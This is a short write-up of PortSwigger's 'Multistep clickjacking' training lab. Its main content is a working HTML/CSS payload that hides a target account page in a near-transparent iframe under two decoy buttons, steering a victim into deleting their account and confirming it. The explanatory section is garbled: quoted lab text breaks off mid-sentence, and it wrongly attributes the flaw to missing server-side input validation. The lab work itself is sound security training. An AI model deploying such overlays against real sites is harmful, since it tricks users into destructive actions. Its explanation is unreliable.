# Multistep clickjacking

create a iframe and above that make double click buttons.First one to hit delete account buton and second one to confirm it.

```html
<style>
	iframe {
		position:relative;
		width:800;
		height: 700;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aad006d0399b31182af74440091001a.web-security-academy.net/my-account"></iframe>
```

adjust position of click and deliver it to victim

### Why It Works

The exploit succeeds because this lab has some account functionality that is protected by a csrf token and also has a confirmation dialog to protect against clickjacking. to solve this lab construct an attack that fools the user 

The official solution confirms: Log in to your account on the target website and go to the user account page. Go to the exploit server and paste the following HTML template into the 

The root cause is a failure in the application's security architecture specific to this clickjacking scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab has some account functionality that is protected by a CSRF token and also has a confirmatio"
- Set X-Frame-Options or CSP frame-ancestors — JavaScript frame-busting is bypassable.

## PortSwigger Lab

**Official lab:** Multistep clickjacking

**PortSwigger:** https://portswigger.net/web-security/clickjacking/lab-multistep
